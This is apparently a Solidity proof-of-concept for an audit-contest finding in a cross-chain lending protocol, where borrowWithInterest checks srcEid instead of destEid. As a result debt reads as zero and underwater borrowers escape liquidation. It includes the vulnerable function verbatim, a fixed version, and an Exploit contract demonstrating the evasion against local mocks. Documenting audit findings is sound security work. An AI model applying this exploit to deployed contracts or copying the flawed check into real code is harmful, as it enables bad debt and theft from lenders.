// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// =============================================================================
//  LEND H-18 — incorrect `srcEid` check in LendStorage.borrowWithInterest
//  (sherlock 2025-05-lend-audit-contest, LendStorage.sol L478-503 @ 713372a1).
//
//  On the source chain (Chain A), a cross-chain borrow record is stored with
//  `srcEid = ChainB` and `destEid = ChainA (= currentEid)`. But borrowWithInterest
//  filters the borrower's cross-chain borrows with `borrows[i].srcEid == currentEid`
//  — which is never true on Chain A (srcEid is ChainB). So the loop skips every
//  real cross-chain borrow and returns 0. The debt is invisible: the account looks
//  over-collateralized and cannot be liquidated even while underwater.
//
//  borrowWithInterest is reproduced VERBATIM (marked @>). The lToken interest index
//  and the liquidation gate are faithful minimal doubles.
// =============================================================================

interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

/*//////////////////////////////////////////////////////////////
        Minimal lToken exposing the borrow interest index
//////////////////////////////////////////////////////////////*/
contract LToken {
    uint256 public borrowIndex;

    constructor(uint256 _index) {
        borrowIndex = _index;
    }
}

/*//////////////////////////////////////////////////////////////
        Minimal ERC20 (the borrowed asset)
//////////////////////////////////////////////////////////////*/
contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   LendStorage — VULNERABLE. borrowWithInterest filters cross-chain
   borrows with `srcEid == currentEid`, but records store destEid ==
   currentEid, so the sum is always 0 on the source chain.
//////////////////////////////////////////////////////////////*/
contract LendStorage {
    struct Borrow {
        uint256 srcEid; // Source chain's layer zero endpoint id
        uint256 destEid; // Destination chain's layer zero endpoint id
        uint256 principle; // Borrowed token amount
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    uint256 public currentEid;
    mapping(address => address) public lTokenToUnderlying;
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;

    function setCurrentEid(uint256 e) external {
        currentEid = e;
    }

    function setLTokenToUnderlying(address l, address u) external {
        lTokenToUnderlying[l] = u;
    }

    function pushCrossChainBorrow(address borrower, address token, Borrow calldata b) external {
        crossChainBorrows[borrower][token].push(b);
    }

    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                // @> WRONG FIELD: records store destEid == currentEid on the source
                // @> chain, so `srcEid == currentEid` is never true and the borrow
                // @> is skipped — borrowWithInterest returns 0 for real debt.
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
}

/*//////////////////////////////////////////////////////////////
   LendStorageFixed — mitigation: filter by destEid == currentEid,
   which is how borrow records are actually stored on the source chain.
//////////////////////////////////////////////////////////////*/
contract LendStorageFixed {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    uint256 public currentEid;
    mapping(address => address) public lTokenToUnderlying;
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;

    function setCurrentEid(uint256 e) external {
        currentEid = e;
    }

    function setLTokenToUnderlying(address l, address u) external {
        lTokenToUnderlying[l] = u;
    }

    function pushCrossChainBorrow(address borrower, address token, Borrow calldata b) external {
        crossChainBorrows[borrower][token].push(b);
    }

    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;
        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        for (uint256 i = 0; i < borrows.length; i++) {
            if (borrows[i].destEid == currentEid) {
                // FIX: records store destEid as the current (source) chain id
                borrowedAmount +=
                    (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
            }
        }
        return borrowedAmount;
    }
}

/*//////////////////////////////////////////////////////////////
   Liquidator — seizes the borrower's held debt tokens only if the
   reported cross-chain debt is non-zero. With the bug it reads 0 and
   never liquidates, so the underwater borrower keeps the funds.
//////////////////////////////////////////////////////////////*/
contract Liquidator {
    LendStorage public immutable store;
    Token public immutable token;

    constructor(LendStorage _store, Token _token) {
        store = _store;
        token = _token;
    }

    // Returns true if a liquidation was performed.
    function tryLiquidate(address borrower, address lToken, address seizeTo) external returns (bool) {
        uint256 debt = store.borrowWithInterest(borrower, lToken);
        if (debt == 0) {
            return false; // account looks healthy — no liquidation
        }
        // Underwater: claw back the outstanding borrow.
        token.transferFrom(borrower, seizeTo, debt);
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — an underwater cross-chain borrower evades liquidation.
   The borrow record is stored (srcEid = ChainB, destEid = ChainA =
   currentEid); borrowWithInterest returns 0 on Chain A, so the
   liquidator skips. The attacker keeps the borrowed principal.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // kept-funds sink

    uint256 internal constant CHAIN_A = 1; // current (source) chain
    uint256 internal constant CHAIN_B = 2; // destination chain
    uint256 internal constant PRINCIPAL = 1_000e18;
    uint256 internal constant INDEX = 1e18;

    Token public token;
    LToken public lToken;
    LendStorage public store;
    Liquidator public liquidator;

    function run() external payable {
        token = new Token();
        lToken = new LToken(INDEX);
        store = new LendStorage();
        liquidator = new Liquidator(store, token);

        store.setCurrentEid(CHAIN_A);
        store.setLTokenToUnderlying(address(lToken), address(token));

        // Cross-chain borrow record as stored on Chain A: srcEid = ChainB, destEid = ChainA.
        store.pushCrossChainBorrow(
            address(this),
            address(token),
            LendStorage.Borrow({
                srcEid: CHAIN_B,
                destEid: CHAIN_A,
                principle: PRINCIPAL,
                borrowIndex: INDEX,
                borrowedlToken: address(lToken),
                srcToken: address(token)
            })
        );

        // The attacker is holding the borrowed principal and is underwater.
        token.mint(address(this), PRINCIPAL);

        // Liquidation attempt: reads 0 debt (bug) → no seizure.
        liquidator.tryLiquidate(address(this), address(lToken), SINK);

        // The attacker still holds the full principal → keep it (route to sink as measured profit).
        token.transfer(SINK, token.balanceOf(address(this)));
    }
}
